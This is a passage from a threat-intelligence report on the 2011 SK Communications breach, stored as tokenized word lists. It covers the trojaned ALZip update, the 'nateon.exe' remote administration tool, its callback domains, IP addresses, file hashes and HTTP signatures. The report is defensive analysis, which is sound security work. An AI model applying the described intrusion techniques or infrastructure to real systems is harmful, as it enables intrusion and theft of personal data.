"existed", "in", "the", "update", "program", "used", "by", "several", "tools", "in", "the", "ALTools", "suite", "."], ["The", "vulnerability", "allowed", "arbitrary", "code", "to", "be", "executed", "but", "could", "only", "be", "exploited", "from", "the", "actual", "update", "server", "or", ",", "if", "a", "computer", "could", "be", "directed", "to", "it", "(", "eg", "."], ["by", "modifying", "the", "host", "file", "on", "the", "computer", "or", "via", "DNS", "hijacking", ")", ",", "a", "fake", "update", "server", "."], ["A", "patch", "for", "the", "vulnerability", "was", "released", "on", "4", "August", "2011", "."], ["(", "ESTsoft", "2011", ")", "(", "ESTsoft", ",", "2011", ")", "12"], ["According", "to", "Microsoft", ",", "a", "DLL", "is", "a", "library", "that", "contains", "code", "and", "data", "that", "can", "be", "used", "by", "more", "than", "one", "program", "at", "the", "same", "time", "."], ["(", "Microsoft", "2007", ")"], ["9", "PAGE", "2", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["software", "update", "from", "the", "server", "13", "."], ["The", "way", "the", "update", "server", "was", "used", "in", "the", "attack", "is", "depicted", "in", "Figure", "1", "."], ["1", "."], ["Attacker", "ALZip", "Update", "Server", "2", "."], ["Targeted"], ["Computers", "Non\u00adtargeted"], ["Computers", "Malicious", "CDN", "Legitimate", "CDN", "3", ".", "1", "."], ["2", "."], ["3", "."], ["Attacker", "modifies", "the", "ALZip", "update", "server", "."], ["Computers", "check", "for", "ALZip", "software", "updates", "and", "are", "redirected", "to", "a", "Content", "Delivery", "Network", "(", "CDN", ")", "."], ["Non\u00adtargeted", "computers", "download", "a", "legitimate", "update", "from", "the", "ESTsoft", "CDN", "."], ["Targeted", "computers", "download", "a", "trojaned", "update", "from", "the", "attacker", "\u2019s", "malicious", "CDN", "."], ["FIGURE", "1", "\u00ad", "DEPICTION", "OF", "HOW", "THE", "ALZIP", "UPDATE", "SERVER", "WAS", "USED", "IN", "THE", "ATTACK"], ["This", "specific", "targeting", "of", "SK", "Communications", "indicates", "the", "targeting", "was", "n\u2019t", "purely", "opportunistic", "."], ["To", "target", "the", "company", "in", "the", "manner", "they", "did", ",", "the", "attackers", "would", "have", "needed", "knowledge", "of", "SK", "Communications", "and", "its", "use", "of", "ALZip", ",", "ahead", "of", "the", "13", "The", "Korean", "National", "Police", "Agency", "presumes", "the", "hacker", ",", "instead", "of", "targeting", "all", "ALZip", "users", ",", "singled", "out", "the", "intranet", "computers", "at", "SK", "Communications", "."], ["(", "Moon\u00adyoung", ",", "2011", ")", "attack", "."], ["This", "knowledge", "was", "likely", "gained", "during", "the", "reconnaissance14", "stage", "of", "the", "attack", "."], ["THE", "INFECTED", "COMPUTERS"], ["After", "the", "ALZip", "update", "program", "(", "ALCMUpdate.exe", ")", "downloaded", "the", "trojaned", "update", "onto", "the", "60", "+", "SK", "Communications", "computers", ",", "the", "computers", "subsequently", "became", "infected", "with", "malware", "known", "as", "\u2018", "Backdoor", ".", "Agent", ".", "Hza", "\u2019", "."], ["The", "trojaned", "update", "file", "\u2018", "dropped", "\u2019", "the", "malware", "\u2018", "Backdoor", "."], ["Agent", "."], ["Hza", "\u2019", "onto", "the", "computers", "and", ",", "in", "so", "doing", ",", "gave", "the", "attacker", "a", "\u2018", "backdoor", "\u2019", "into", "them", "."], ["The", "trojaned", "update", "is", "detected", "as", "\u2018", "Trojan", ".", "Dropper", ".", "Agent", ".", "Hza", "Backdoor", ".", "Agent", ".", "Hza", "\u2019", "and", "\u2018", "V.DRP.Agent", ".", "Hza", "V.BKD.Agent", ".", "Hza", "\u2019", "by", "different", "versions", "of", "ESTsoft", "\u2019s"], ["ALYac", "antivirus", "software", "."], ["(", "ESTsoft", ",", "2011", ")", "(", "ESTsoft", ",", "2011", ")"], ["Once", "infected", ",", "the", "computers", "communicated", "with", "the", "command", "and", "control", "server", "located", "at", "South", "Korean", "IP", "address", "116.127.121.41", "on", "Transmission", "Control", "Protocol", "(", "TCP", ")", "port", "8080", "15", "."], ["It", "is", "possible", "the", "infected", "SK", "computers", "used", "the", "callback", "domain", "\u2018", "update.alyac.org", "\u2019", "(", "reportedly", "associated", "with", "the", "hack", "16", ")", "to", "locate", "the", "command", "and", "control", "server", "."], ["It", "is", ",", "however", ",", "unconfirmed", "whether", "the", "domain", "\u2018", "update.alyac.org", "\u2019", "resolved", "to", "the", "South", "Korean", "IP", "address", "at", "the", "time", "of", "the", "attack", "."], ["(", "ESTsoft", ",", "2011", ")", "(", "Samsung", "IDC", ",", "2011", ")"], ["(", "ETnews", ",", "2011", ")"], ["Between", "18", "July", "2011", "and", "25", "July", "2011", ",", "the", "attackers", "used", "the", "infected", "computers", "to", "collect", "additional", "internal", "access", "information", "and", "database", "credentials", "."], ["They", "presumably", "used", "a", "file", "named", "\u2018", "x.exe\u201917", "to", "acquire", "some", "of", "this", "information", ",", "after", "downloading", "it", "onto", "infected", "computers", "from", "a", "toolbox", "they", "had", "earlier", "set", "up", "."], ["Based", "on", "the", "behaviour", "of", "this", "file", ",", "the", "attackers", "likely", "used", "it", "to", "conduct", "network", "enumeration", "and", "to", "obtain", "14", "For", "an", "explanation", "of", "the", "reconnaissance", "stage", "of", "an", "attack", "refer", "to", "the", "Command", "Five", "Paper", "\u2018", "Advanced", "Persistent", "Threats", ":", "A", "Decade", "in", "Review", "\u2019", "(", "Command", "Five", "Pty", "Ltd", ",", "2011", ")", "."], ["15"], ["According", "to", "Samsung", "IDC", ",", "the", "ALTools", "related", "command", "and", "control", "server", "was", "using", "IP", "address", "116.127.121.41", "."], ["16"], ["According", "to", "ETnews", "the", "domain", "\u2018", "update.alyac.org", "\u2019", "was", "used", "in", "the", "hack", "."], ["ETnews", "does", "not", "state", "how", "the", "domain", "was", "involved", "but", ",", "given", "the", "infected", "computers", "had", "ALTools", "installed", "on", "them", ",", "use", "of", "\u2018", "ALYac.org", "\u2019", "in", "the", "callback", "domain", "may", "have", "helped", "to", "disguise", "the", "malicious", "communications", "."], ["(", "ETnews", "2011", ")"], ["17"], ["The", "file", "named", "\u2018", "x.exe", "\u2019", "is", "51712", "bytes", "and", "has", "a", "SHA1", "hash", "of", "5A1B", "E6AD", "CB2C", "C40B", "2E9D", "6B6C", "569F", "D4DA", "B273", "E7AD", "."], ["(", "JSUNPACK", ",", "2011", ")", "PAGE", "3", "OF", "24"], ["COPYRIGHT"], ["\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["credentials", "such", "as", "usernames", "and", "passwords", "18", "."], ["(", "Birdman", ",", "2011", ")", "(", "Moon\u00adyoung", ",", "2011", ")"], ["The", "attacker", "also", "installed", "the", "malware", "used", "to", "access", "the", "user", "databases", "on", "at", "least", "one", "of", "the", "infected", "computers", "."], ["The", "malware", "was", "named", "\u2018", "nateon.exe", "\u2019", "19", "and", "was", "also", "hosted", "on", "the", "same", "toolbox", ",", "along", "with", "another", "file", "named", "\u2018", "rar.exe", "\u2019", "20", "."], ["(", "Birdman", ",", "2011", ")", "(", "Hauri", "\u00ad", "Response", "Team", ",", "2011", ")"], ["Static", "analysis21", "of", "the", "file", "\u2018", "rar.exe", "\u2019", "indicates", "it", "is", "a", "modified", "version", "of", "the", "WinRar", "22", "command", "line", "program", "\u00ad", "also", "named", "\u2018", "rar.exe", "\u2019", "."], ["The", "file", "may", "have", "been", "used", "in", "the", "attack", "to", "create", "or", "open", "archive", "files", "."], ["The", "modifications", "made", "to", "the", "program", "remove", "the", "program", "properties", "from", "display", ",", "presumably", "to", "disguise", "the", "true", "nature", "of", "the", "file", "."], ["This", "is", "somewhat", "redundant", "in", "this", "instance", "though", ",", "given", "the", "file", "name", "indicates", "the", "nature", "of", "the", "program", "."], ["THE", "TOOLBOX"], ["The", "files", "downloaded", "onto", "the", "infected", "SK", "Communications", "computers", "were", "reportedly", "hosted", "at", "\u2018", "www.cph.com.tw/act\u201923", "\u2013"], ["a", "website", "belonging", "to", "the", "large", "Taiwanese", "publishing", "company", ",", "Cite", "Media", "Holding", "Group", "24", "."], ["It", "is", "likely", "the", "company", "\u2019s", "webserver", "was", "compromised", "unbeknownst", "to", "its", "owner", "and", "used", "by", "the", "attacker", "as", "a", "toolbox", "from", "which", "to", "download", "malicious", "files", "and", "hacker", "tools", "onto", "targeted", "computers", "."], ["likely", "running", "Microsoft", "Windows", "."], ["There", "are", "a", "number", "of", "known", "vulnerabilities", "for", "both", "IIS", "and", "Microsoft", "Windows", "which", "potentially", "could", "have", "been", "exploited", "and", "resulted", "in", "the", "compromise", "of", "the", "webserver26", "."], ["THE", "DATABASE", "ACCESS"], ["After", "the", "week", "collecting", "information", "from", "the", "infected", "computers", "the", "attackers", "were", "ready", "to", "access", "the", "databases", "."], ["On", "26", "July", "2011", ",", "they", "used", "the", "information", "they", "had", "gathered", ",", "along", "with", "a", "malicious", "program", "named", "\u2018", "nateon.exe", "\u2019", ",", "to", "access", "the", "Nate", "and", "CyWorld", "databases", "."], ["The", "theft", "of", "information", "continued", "into", "the", "following", "day", "\u00ad", "27", "July", "2011", "."], ["(", "Birdman", ",", "2011", ")", "(", "Moon\u00adyoung", ",", "2011", ")"], ["(", "Hauri", "\u00ad", "Response", "Team", ",", "2011", ")"], ["The", "personal", "information", "extracted", "from", "the", "databases", "was", "purportedly", "sent", "via", "a", "waypoint", "to", "a", "Chinese", "IP", "address", "where", "the", "hacker", "received", "the", "information", "."], ["The", "waypoint", "used", "purportedly", "belonged", "to", "a", "company", "based", "in", "Seoul", "\u2019s", "Nonhyeon", "neighbourhood", "."], ["(", "Moon\u00adyoung", ",", "2011", ")"], ["The", "South", "Korean", "waypoint", "may", "have", "been", "located", "by", "the", "malware", "using", "the", "callback", "domain", "\u2018", "ro.diggfunny.com", "\u2019", "which", "was", "reportedly", "associated", "with", "the", "leak", "of", "information", "from", "the", "databases", "27", "."], ["It", "has", "not", ",", "however", ",", "been", "confirmed", "whether", ",", "at", "the", "time", "of", "the", "attack", ",", "this", "callback", "domain", "pointed", "to", "an", "IP", "address", "belonging", "to", "a", "Nonhyeon\u00adbased", "company", "."], ["The", "website", "\u2018", "cph.com.tw", "\u2019", "is", "assumed", "to", "have", "been", "running", "on", "an", "Internet", "Information", "Services", "(", "IIS", ")", "webserver", "at", "the", "time", "the", "server", "was", "hacked", "25", "."], ["IIS", "runs", "on", "the", "Microsoft", "Windows", "operating", "system", ",", "indicating", "the", "compromised", "server", "was", "Antivirus", "software", "detects", "the", "file", "as", "\u2018", "Heuristic", ".", "BehavesLike", ".", "Win32.PasswordStealer", ".", "H", "\u2019", "and", "\u2018", "HKTL_NETVIEW", "\u2019", "."], ["(", "Hispasec", "Sistemas", ",", "2011", ")"], ["19"], ["The", "file", "named", "\u2018", "nateon.exe", "\u2019", "is", "166912", "bytes", "and", "has", "a", "SHA1", "hash", "of", "F84C", "D73D", "ABF1", "8660", "7F98", "6DF9", "8C54", "02A5", "7BB5", "8AD1", "."], ["It", "is", "detected", "as", "\u2018", "Backdoor", ".", "Sogu", "\u2019", "by", "Symantec", "antivirus", "software", "."], ["(", "JSUNPACK", "2011", ")", "."], ["(", "Hispasec", "Sistemas", ",", "2011", ")"], ["20"], ["The", "file", "named", "\u2018", "rar.exe", "\u2019", "is", "337920", "bytes", "and", "has", "a", "SHA1", "hash", "of", "E87C", "3ACB", "A599", "5E01", "7AD3", "1B29", "A5E2", "FE36", "3ED4", "D9EB", "."], ["(", "JSUNPACK", "2011", ")"], ["21", "Static", "analysis", "refers", "to", "analysis", "of", "a", "program", "\u2019s", "code", "to", "determine", "its", "functionality", ",", "as", "opposed", "to", "dynamic", "analysis", "in", "which", "a", "program", "is", "executed", "to", "determine", "its", "behaviour", "."], ["22", "WinRAR", "is", "a", "popular", "archiving", "and", "compression", "tool", "."], ["23"], ["The", "files", "\u2018", "nateon.exe", "\u2019", ",", "\u2018", "rar.exe", "\u2019", "and", "\u2018", "x.exe", "\u2019", "were", "hosted", "at", "\u2018", "www.cph.com.tw/act", "\u2019", "."], ["(", "Birdman", ",", "2011", ")", "24", "Cite", "Media", "Holding", "Group", "publishes", "over", "20", "million", "magazine", "issues", "each", "year", "in", "Taiwan", "."], ["(", "Novell", "2011", ")"], ["25", "An", "archived", "error", "page", "shows", "the", "\u2018", "cph.com.tw", "\u2019", "website", "was", "running", "on", "an", "IIS", "server", "in", "late", "2010", "."], ["(", "The", "Internet", "Archive", "2010", ")"], ["18", "26", "Both", "the", "Microsoft", "Security", "TechCenter", "and", "the", "US", "National", "Vulnerability", "Database", "make", "available", "a", "comprehensive", "list", "of", "Microsoft", "Windows", "and", "IIS", "vulnerabilities", "."], ["(", "Microsoft", "n.d", ".", ")"], ["(", "National", "Institute", "of", "Standards", "and", "Technology", "n.d", ".", ")", "27"], ["According", "to", "Samsung", "IDC", "the", "IP", "address", "116.127.121.109", "was", "associated", "with", "the", "leak", "of", "database", "files", "from", "Nate", "."], ["(", "Samsung", "IDC", "2011", ")", "PAGE", "4", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["10026210/10070910", ":", "10026220/10070920", ":", "10026230/10070930", ":", "10026240/10070940", ":", "\u2026", "100268A0/10070FA0", ":", "100268B0/10070FB0", ":", "100268C0/10070FC0", ":", "100268D0/10070FD0", ":", "\u2026"], ["10026930/10071030", ":", "31", "6E", "63", "00", "9C", "61", "6F", "00"], ["6C", "74", "6D", "00"], ["4C", "65", "00", "00", "B9", "6F", "00", "00"], ["3A", "6E", "00"], ["00", "10", "2E", "00", "00", "00"], ["64", "00", "00", "E8", "75", "00", "00", "03", "61", "00", "00", "00", "6D", "00", "00"], ["00", "6C", "00", "00"], ["01", "69", "00", "00", "00"], ["76", "00", "00"], ["50", "65", "00", "00", "00", "2E", "00", "00"], ["1.lL.:", ".."], ["\u00e8", ".....", "P.", "nateon.duamlive", "."], ["com", ".............", "................"], ["00", "00"], ["76", "00", "00", "00", "63", "00", "00", "00", "66", "00", "00", "00"], ["73", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "00", "77", "00", "00", "00"], ["69", "00", "00", "00", "6E", "00", "00", "00", "73", "00", "00", "................", "............", "wins", "vcfs", "............"], ["................", "00", "00", "00", "00", "00"], ["00", "00"], ["00", "00", "00", "00", "00", "............"], ["FIGURE", "2", "\u00ad", "EXCERPTS", "FROM", "THE", "\u2018", "NATEON.EXE", "\u2019", "CONFIGURATION", "BLOCK"], ["THE", "DESTORY", "RAT"], ["Structure", "and", "Behaviour"], ["The", "malicious", "program", "named", "\u2018", "nateon.exe", "\u2019", "installs", "a", "Remote", "Administration", "Tool", "(", "RAT", ")", "named", "\u2018", "winsvcfs.dll", "\u2019", "."], ["It", "modifies", "the", "system", "registry", "in", "such", "a", "way", "that", "the", "RAT", "gets", "executed", "as", "a", "service", "by", "the", "trusted", "process", "\u2018", "svchost.exe", "\u2019", "28", "each", "time", "the", "computer", "is", "started", "."], ["Once", "\u2018", "winsvcfs.dll", "\u2019", "is", "installed", ",", "\u2018", "nateon.exe", "\u2019", "is", "deleted", "."], ["Both", "\u2018", "nateon.exe", "\u2019", "29", "and", "\u2018", "winsvcfs.dll\u201930", "are", "now", "detected", "by", "some", "antivirus", "software", "."], ["Static", "analysis", "of", "the", "malware", "reveals", "a", "configuration", "block", "."], ["This", "configuration", "block", "contains", "the", "name", "of", "the", "DLL", "file", "which", "\u2018", "nateon.exe", "\u2019", "is", "to", "create", "."], ["In", "this", "instance", ",", "the", "configured", "named", "was", "\u2018", "winsvcfs.dll", "\u2019", ",", "as", "shown", "in", "Figure", "2", "."], ["Due", "to", "the", "name", "being", "configurable", ",", "the", "RAT", "will", "not", "always", "be", "called", "\u2018", "winsvcfs.dll", "\u2019", "."], ["The", "configuration", "block", "also", "contains", "a", "callback", "domain", "and", "port", "for", "the", "malware", "\u2019s", "command", "and", "control", "communications", "."], ["The", "callback", "domain", "is", "configured", "to", "be", "\u2018", "nateon.duamlive.com", "\u2019", "and", "the", "port", "is", "configured", "to", "be", "80", "(", "50", "in", "hexadecimal", ")", ",", "also", "shown", "in", "Figure", "2", "."], ["If", "no", "configuration", "is", "specified", ",", "the", "malware", "uses", "default", "values", "instead", "."], ["The", "default", "callback", "location", "hardcoded", "into", "the", "malware", "is", "the", "private", "IP", "address", ",", "192.168.0.200", "."], ["This", "address", "is", "not", "28"], ["The", "process", "\u2018", "svchost.exe", "\u2019", "is", "a", "generic", "host", "process", "for", "services", "which", "run", "from", "DLLs", "."], ["(", "Microsoft", ",", "A", "description", "of", "Svchost.exe", "in", "Windows", "XP", "Professional", "Edition", "2007", ")", "29"], ["On", "29", "July", "2011", ",", "23", "of", "43", "antivirus", "products", "tested", "detected", "\u2018", "nateon.exe", "\u2019", "as", "malware", ",", "as", "of", "19", "August", "2011", "this", "number", "had", "increased", "to", "36", "of", "the", "43", "."], ["(", "Hispasec", "Sistemas", "2011", ")"], ["(", "Hispasec", "Sistemas", "2011", ")"], ["30"], ["As", "of", "6", "September", "2011", ",", "34", "of", "44", "antivirus", "products", "tested", "detected", "\u2018", "winsvcfs.dll", "\u2019", "as", "malware", "."], ["(", "Hispasec", "Sistemas", "2011", ")", "routable", "on", "the", "Internet", "and", "suggests", "the", "attackers", "rely", "on", "the", "configuration", "instead", "of", "the", "hardcoded", "callback", "address", "."], ["According", "to", "information", "contained", "within", "\u2018", "nateon.exe", "\u2019", ",", "the", "malware", "used", "in", "the", "SK", "Communications", "hack", "was", "compiled", "from", "source", "code", "on", "27", "September", "2010", "at", "01:17.04", "\u00ad", "over", "6", "months", "before", "the", "attack", "."], ["The", "configuration", "block", "was", "likely", "inserted", "into", "the", "binary", "after", "this", "date", "as", "the", "callback", "domain", "was", "not", "registered", "until", "May", "2011", "."], ["This", "may", "indicate", "that", "the", "RAT", "has", "been", "used", "in", "other", "attacks", "but", "with", "different", "configurations", "."], ["If", "the", "previously", "identified", "\u2018", "Backdoor", "."], ["Sogu", "\u2019", "31", "is", "a", "version", "of", "the", "malware", ",", "other", "callback", "domains", "previously", "configured", "may", "include", "those", "known", "to", "be", "used", "by", "\u2018", "Backdoor", ".", "Sogu", "\u2019", "."], ["These", "domains", "include", "\u2018", "bbs.afbjz.com", "'", ",", "\u2018", "newhose.ntimobile.com", "'", ",", "and", "\u2018", "www.adv138mail.com'32", "."], ["The", "RAT", "has", "many", "different", "capabilities", "and", "runs", "on", "multiple", "versions", "of", "the", "Microsoft", "Windows", "operating", "system", "."], ["The", "RAT", "'s", "behaviour", "changes", "slightly", "depending", "on", "which", "version", "of", "the", "Windows", "operating", "system", "it", "is", "installed", "on", "and", "which", "modules", "are", "installed", "."], ["Modules", "used", "by", "the", "RAT", "deployed", "to", "the", "SK", "Communications", "network", "include", ":", "31", "Symantec", "antivirus", "software", "detects", "\u2018", "nateon.exe", "\u2019", "as", "'", "Backdoor", "."], ["Sogu", "'", "."], ["The", "malware", "described", "by", "Symantec", "exhibits", "similar", "behaviour", "to", "'", "nateon.exe", "'", "but", "is", "a", "smaller", "size", "."], ["(", "Mullaney", ",", "2011", ")", "32"], ["In", "addition", "to", "being", "used", "by", "\u2018", "Backdoor", "."], ["Sogu", "\u2019", ",", "the", "callback", "domain", "'", "www.adv138mail.com", "'", "was", "used", "by", "a", "Poison", "Ivy", "RAT", "in", "a", "July", "2011", "socially", "engineered", "email", "campaign", "which", "targeted", "experts", "on", "the", "relationship", "of", "the", "United", "States", "with", "Japan", ",", "China", "and", "Taiwan", "."], ["(", "Parkour", ",", "2011", ")", "PAGE", "5", "OF", "24"], ["COPYRIGHT"], ["\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["\ufffd"], ["\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "advapi32.dll", ",", "cryptbase.dll", ",", "gdi32.dll", ",", "iphlpapi.dll", ","], ["kernel32.dll", ",", "mpr.dll", ",", "msvcrt.dll", ",", "ntdll.dll", ",", "odbc32.dll", ",", "ole32.dll", ",", "psapi.dll", ",", "sfc.dll", ",", "shell32.dll", ",", "shlwapi.dll", ",", "user32.dll", ",", "userenv.dll", ",", "version.dll", ",", "wininet.dll", ",", "ws2_32.dll", ",", "wtsapi32.dll", "."], ["running", "on", "the", "computer", ",", "download", "files", ",", "create", "files", ",", "take", "screenshots", "and", "shutdown", ",", "reboot", "or", "log", "out", "of", "the", "computer", "."], ["The", "RAT", "has", "four", "different", "operating", "modes", ";", "SMI", "(", "Install", ")", ",", "SMU", "(", "Uninstall", ")", ",", "SMRAC", "(", "Run", "as", "Console", ")", "and", "SMRACU", "(", "Run", "as", "Console", "User", ")", "."], ["(", "Hauri", "\u00ad", "Response", "Team", ",", "2011", ")"], ["A", "complete", "list", "of", "strings", "obtained", "through", "static", "analysis", "of", "the", "malware", "is", "provided", "in", "Annex", "A."], ["These", "strings", "give", "additional", "insight", "into", "the", "RAT", "and", "its", "behaviour", "."], ["Of", "note", ",", "a", "unique", "string", "is", "present", "which", "may", "be", "used", "to", "associate", "\u2018", "nateon.exe", "\u2019", "with", "other", "malware", "."], ["This", "string", "is", "\u2018", "CONFIG", "DESTORY", "!", "\u2019"], ["and", "is", "contained", "within", "the", "malware", "in", "an", "obfuscated", "form", "."], ["The", "string", "is", "displayed", "in", "a", "pop\u00adup", "window", "if", "an", "integrity", "check", "the", "malware", "performs", "on", "its", "configuration", "fails", "."], ["Of", "note", ",", "the", "module", "\u2018", "odbc32.dll", "\u2019", "is", "used", "in", "the", "access", "of", "databases", "."], ["The", "RAT", "uses", "a", "number", "of", "Standard", "Query", "Language", "(", "SQL", ")", "33", "functions", "which", "are", "accessed", "(", "or", "more", "technically", ",", "dynamically", "imported", ")", "as", "the", "software", "runs", "."], ["These", "include", ":", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd", "\ufffd"], ["\ufffd", "SQLAllocHandle", ",", "SQLColAttributeW", ",", "SQLDisconnect", ","], ["SQLDriverConnectW", ",", "SQLExecDirectW", ",", "SQLFetch", ",", "SQLFreeHandle", ",", "SQLGetData", ",", "SQLGetDiagRecW", ",", "SQLMoreResults", ",", "SQLNumResultCols", ",", "SQLSetEnvAttr", "."], ["The", "RAT", "employs", "some", "basic", "obfuscation", "techniques", "."], ["All", "strings", "are", "obfuscated", "in", "memory", "and", "only", "decoded", "when", "they", "need", "to", "be", "used", ",", "thereby", "making", "static", "analysis", "more", "difficult", "."], ["In", "addition", ",", "unnecessary", "operations", "are", "inserted", "at", "frequent", "intervals", "throughout", "the", "code", "."], ["The", "prolific", "use", "of", "unnecessary", "operations", "is", "likely", "to", "make", "reverse", "engineering", "more", "difficult", "and", "potentially", "indicates", "that", "the", "malware", "is", "polymorphic", "34", "."], ["The"], ["RAT", ",", "while", "in", "some", "ways", "sophisticated", ",", "still", "hides", "in", "plain", "sight", "\u2013", "limiting", "its", "scope", "for", "obfuscation", "."], ["Communications"], ["These", "functions", "would", "have", "been", "utilised", "by", "the", "attacker", "to", "communicate", "with", "the", "Nate", "and", "CyWorld", "user", "databases", "and", "thereby", ",", "to", "obtain", "the", "personal", "details", "."], ["The", "RAT", "can", "not", "only", "access", "and", "query", "databases", "but", "can", "also", "enumerate", "the", "networks", "to", "which", "the", "infected", "computer", "is", "connected", ",", "set", "up", "network", "connections", ",", "modify", "the", "registry", ",", "lock", "the", "workstation", "'s", "screen", ",", "control", "processes", "and", "services"], ["33", "SQL", "instructions", "are", "used", "to", "query", "certain", "types", "of", "databases", "and", "obtain", "information", "from", "them", "."], ["The", "RAT", "attempts", "communications", "to", "a", "command", "and", "control", "server", "located", "using", "a", "callback", "domain", "."], ["It", "also", "creates", "a", "raw", "socket", "and", "binds", "it", "to", "the", "infected", "computer", "\u2019s", "local", "IP", "address", "(", "as", "assigned", "to", "the", "computer", "\u2019s", "network", "interface", "card", ")", "."], ["This", "is", "not", ",", "however", ",", "for", "the", "RAT", "to", "accept", "inbound", "connection", "requests", "."], ["The", "socket", "is", "configured", "by", "the", "RAT", "in", "such", "a", "way", "that", "it", "acts", "as", "a", "packet", "sniffer", ",", "whereby", ",", "the", "RAT", "receives", "a", "copy", "of", "all", "inbound", "and", "outbound", "network", "traffic", "on", "the", "bound", "interface", "."], ["As", "well", "as", "enabling", "deep", "inspection", "of", "this", "network", "traffic", ",", "the", "capability", "could", "allow", "the", "RAT", "to", "passively", "receive", "commands", "on", "any", "port", "using", "any", "protocol", "."], ["Before", "attempting", "communications", "to", "the", "command", "and", "control", "server", ",", "the", "malware", "checks", "for", "network", "connectivity", "."], ["It", "does", "this", "by", "using", "the", "34", "Polymorphic", "programs", "can", "be", "modified", "(", "or", "modify", "themselves", ")", "to", "have", "a", "different", "file", "hash", "and/or", "size", "while", "retaining", "the", "same", "functionality", "."], ["This", "facilitates", "code", "reuse", "by", "making", "signature", "based", "detection", "more", "difficult", "."], ["PAGE", "6", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["legitimate", "Microsoft", "Windows", "domain", "\u2018", "download.windowsupdate.com", "\u2019", "."], ["This", "legitimate", "domain", "is", "hardcoded", "into", "the", "malware", "but", "may", "be", "overridden", "by", "modifying", "the", "malware", "\u2019s", "configuration", "."], ["by", "the", "attackers", "to", "disguise", "them", "as", "being", "associated", "with", "NateOn", "\u00ad", "an", "Instant", "Messaging", "Service", "owned", "by", "SK", "Communications", "."], ["Legitimate", "files", "developed", "by", "SK", "Communications", "are", "also", "known", "by", "the", "name", "\u2018", "nateon.exe'37", "."], ["Having", "determined", "there", "is", "network", "connectivity", ",", "the", "malware", "establishes", "communications", "with", "the", "callback", "domain", "\u2018", "nateon.duamlive.com", "'", "35", "on", "TCP", "port", "80", "(", "configured", "as", "noted", "previously", ")", "."], ["Communications", "occur", "over", "the", "HyperText", "Transfer", "Protocol", "(", "HTTP", ")", "protocol", "\u2013", "a", "protocol", "commonly", "used", "on", "TCP", "port", "80", "for", "website", "browsing", "."], ["The", "malware", "appears", "to", "be", "proxy\u00adaware", "and", "capable", "of", "communicating", "via", "a", "web", "proxy", "."], ["THE", "MALICIOUS", "INFRASTRUCTURE"], ["The", "following", "malformed", "user\u00adagent36", "is", "present", "in", "the", "HTTP", "requests", "(", "spaces", "shown", "here", "as", "\u2018", "\u00b7", "\u2019", "):", "\u2018", "Mozilla/4.0\u00b7(compatible;\u00b7MSIE\u00b76.0;\u00b7Windows\u00b7NT\u00b75", ".", "1;SV1", ";", "\u2019", "."], ["This", "user\u00adagent", "is", "consistent", "with", "that", "which", "may", "be", "expected", "from", "a", "user", "running", "version", "6.0", "of", "the", "Microsoft", "Internet", "Explorer", "web", "browser", "on", "the", "Microsoft", "Windows", "XP", "operating", "system", ",", "except", "that", "it", "is", "missing", "a", "closing", "bracket", "after", "the", "last", "semicolon", "and", "a", "space", "after", "the", "second", "to", "last", "semicolon", "."], ["This", "malformed", "user\u00adagent", "is", "hardcoded", "and", "can", "be", "used", "as", "a", "signature", "to", "detect", "HTTP", "communications", "produced", "by", "the", "malware", "."], ["Four", "custom", "headers", "are", "also", "present", "in", "the", "HTTP", "requests", ":", "\u2018", "X\u00adSession", "\u2019", ",", "\u2018", "X\u00adStatus", "\u2019", ",", "\u2018", "X\u00adSize", "\u2019", ",", "and", "\u2018", "X\u00adSn", "\u2019", "."], ["The", "file", "path", "requested", "is", "\u2018", "/update?product", "=", "windows", "\u2019", "."], ["These", "custom", "headers", "and", "the", "file", "path", "may", "also", "be", "used", "to", "develop", "signatures", "for", "detection", "of"], ["the"], ["RAT", "\u2019s", "communications", "."], ["Once", "the", "malware", "successfully", "contacted", "the", "command", "and", "control", "server", ",", "the", "attacker", "would", "have", "been", "able", "to", "give", "it", "instructions", "to", "access", "the", "Nate", "and", "Cyworld", "databases", "and", "to", "send", "data", "from", "them", "back", "to", "a", "location", "the", "attacker", "could", "access", "."], ["The", "name", "of", "the", "malware", "and", "the", "name", "of", "the", "selected", "callback", "domain", "were", "presumably", "chosen"], ["35", "Multiple", "sources", "confirm", "the", "malware", "used", "in", "the", "hack", "called", "back", "to", "'", "nateon.duamlive.com", "'", "."], ["(", "Samsung", "IDC", "2011", ")", "(", "Birdman", ",", "2011", ")", "36", "User\u00adagents", "are", "used", "in", "HTTP", "communications", "to", "tell", "webservers", "which", "operating", "system", "and", "web", "browser", "their", "clients", "are", "using", ",", "so", "they", "can", "serve", "compatible", "webpages", "."], ["Callback", "domains", "are", "translated", "to", "IP", "addresses", "using", "the", "Domain", "Name", "System", "(", "DNS", ")", "38", "protocol", "."], ["This", "translates", "the", "domain", "into", "a", "unique", "address", "on", "the", "Internet", "which", "infected", "computers", "can", "use", "to", "locate", "and", "communicate", "with", "a", "command", "and", "control", "server", "."], ["Command", "and", "control", "servers", "are", "typically", "more", "resource", "intensive", "to", "set", "up", "and", "maintain", "than", "callback", "domains", "which", "may", "be", "used", "to", "direct", "communications", "to", "them", "."], ["It", "is", "not", "uncommon", "for", "multiple", "domains", "to", "identify", "the", "same", "command", "and", "control", "infrastructure", "."], ["In", "late", "July", "2011", ",", "at", "the", "time", "of", "the", "attack", ",", "the", "callback", "domain", "\u2018", "nateon.duamlive.com", "\u2019", 